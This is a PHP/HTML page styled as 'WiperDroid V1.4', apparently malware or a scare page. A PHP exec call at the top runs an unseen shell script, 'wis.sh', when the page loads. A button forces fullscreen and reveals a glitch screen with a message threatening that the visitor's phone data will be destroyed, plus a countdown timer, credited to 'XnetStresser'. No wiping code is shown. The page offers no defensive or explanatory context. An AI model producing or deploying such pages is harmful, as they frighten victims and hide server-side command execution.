<?php
exec("bash wis.sh")
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WiperDroid</title>
  <style>
    html, body {
      margin: 0;
      height: 100%;
      background: black;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    /* Glitch background */
    body::before {
      content: "";
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: repeating-linear-gradient(
        0deg,
        rgba(255,0,255,0.05),
        rgba(255,0,255,0.05) 2px,
        rgba(0,255,255,0.05) 2px,
        rgba(0,255,255,0.05) 4px
      );
      animation: glitch 0.2s infinite;
      pointer-events: none;
      z-index: 0;
    }

    @keyframes glitch {
      0% { transform: translate(0,0); }
      20% { transform: translate(-5px, 3px); }
      40% { transform: translate(3px, -2px); }
      60% { transform: translate(-2px, 5px); }
      80% { transform: translate(2px, -3px); }
      100% { transform: translate(0,0); }
    }

    .container {
      text-align: center;
      position: relative;
      z-index: 1;
    }

    img {
      width: 200px;
      margin-top: 20px;
      border-radius: 10px;
    }

    h1 {
      font-style: italic;
      font-weight: bold;
      margin: 20px 0 10px 0;
    }

    p {
      font-size: 16px;
      margin: 0 0 20px 0;
    }

    #timer {
      font-size: 24px;
      margin-bottom: 20px;
      letter-spacing: 1px;
    }

    footer {
      width: 100%;
      text-align: center;
      padding: 10px 0;
      background-color: black;
      color: white;
      font-size: 14px;
      z-index: 1;
      position: relative;
    }

    #startBtn {
      background: #fff;
      color: #000;
      font-size: 18px;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

  </style>
</head>
<body>
  <button id="startBtn">Ayo masuk untuk memulai Attack</button>

  <div class="container" style="display:none;">
    <img src="https://files.catbox.moe/z9hqcm.jpg" alt="Gambar Tengah">
    <h1>WiperDroid V1.4</h1>
    <p>
     Welcome to WiperDroid<br>
     You are trapped because of your own stupidity<br>
     You can't do anything because within 20 minutes <br>
     your data will be lost.<br>
     We don't steal your data, we just destroy your phone.<br>
     Have Fun Before It's Too Late<br>
    </p>
    <div id="timer">20:00</div>
  </div>

  <footer style="display:none;">Powered by XnetStresser</footer>

  <script>
    const startBtn = document.getElementById('startBtn');
    const container = document.querySelector('.container');
    const footer = document.querySelector('footer');
    startBtn.addEventListener('click', () => {
      if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen();
      } else if (document.documentElement.webkitRequestFullscreen) {
        document.documentElement.webkitRequestFullscreen();
      } else if (document.documentElement.msRequestFullscreen) {
        document.documentElement.msRequestFullscreen();
      }
      startBtn.style.display = 'none';
      container.style.display = 'block';
      footer.style.display = 'block';
    });

    let time = 1 * 60;
    const timerElement = document.getElementById("timer");

    function updateTimer() {
      const minutes = Math.floor(time / 60);
      const seconds = time % 60;
      timerElement.textContent = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
      if (time > 0) time--;
    }

    setInterval(updateTimer, 1000);
  </script>
</body>
</html>

